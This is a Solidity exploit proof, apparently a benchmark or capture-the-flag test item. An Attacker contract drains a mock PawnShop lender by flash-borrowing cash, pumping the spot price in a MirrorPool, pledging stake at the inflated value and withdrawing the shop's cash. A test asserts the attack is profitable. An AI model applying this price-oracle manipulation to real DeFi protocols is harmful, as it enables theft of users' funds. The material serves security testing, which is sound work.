contract Attacker is Borrower {
    Coin stake;
    Coin cash;
    MirrorPool pool;
    QuickLoan loan;
    PawnShop shop;

    constructor(Coin _stake, Coin _cash, MirrorPool _pool, QuickLoan _loan, PawnShop _shop) {
        stake = _stake;
        cash = _cash;
        pool = _pool;
        loan = _loan;
        shop = _shop;
    }

    function attack() external {
        // Borrow a large amount of cash from QuickLoan
        uint256 borrowAmt = 900_000e18;
        loan.borrow(borrowAmt, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        // 1. Swap borrowed cash for stake to pump the spot price in MirrorPool
        cash.approve(address(pool), amount);
        uint256 stakeOut = pool.swapCashForStake(amount);

        // 2. Pledge a small portion of the acquired stake to PawnShop
        // Since price is inflated, this small stake looks extremely valuable
        uint256 pledgeAmt = 100e18;
        stake.approve(address(shop), pledgeAmt);
        shop.pledge(pledgeAmt);

        // 3. Draw out a massive amount of cash from PawnShop based on the fake high valuation
        uint256 cashToDraw = cash.balanceOf(address(shop));
        shop.draw(cashToDraw);

        // 4. Swap remaining stake back to cash to normalize pool / get cash for repayment
        stake.approve(address(pool), stake.balanceOf(address(this)));
        pool.swapStakeForCash(stake.balanceOf(address(this)));

        // 5. Repay flash loan
        cash.transfer(address(loan), amount);
    }
}

contract ProveHallOfMirrorsLeadOne is ExploitProof {
    function test_exploit() external {
        Coin stake = new Coin("Stake");
        Coin cash = new Coin("Cash");

        MirrorPool pool = new MirrorPool(stake, cash);
        QuickLoan loan = new QuickLoan(cash);
        PawnShop shop = new PawnShop(stake, cash, pool);

        // Seed pool with initial liquidity
        stake.mint(address(this), 1_000_000e18);
        cash.mint(address(this), 1_000_000e18);

        stake.approve(address(pool), 100_000e18);
        cash.approve(address(pool), 100_000e18);
        pool.seed(100_000e18, 100_000e18);

        // Fund QuickLoan with cash
        cash.mint(address(loan), 1_000_000e18);

        // Deploy attacker and give initial stake
        Attacker attacker = new Attacker(stake, cash, pool, loan, shop);
        stake.mint(address(attacker), 1000e18);

        uint256 attackerCashBefore = cash.balanceOf(address(attacker));

        // Execute exploit
        attacker.attack();

        uint256 attackerCashAfter = cash.balanceOf(address(attacker));
        profit = attackerCashAfter - attackerCashBefore;

        assertExploitLanded(1 ether);
    }
}

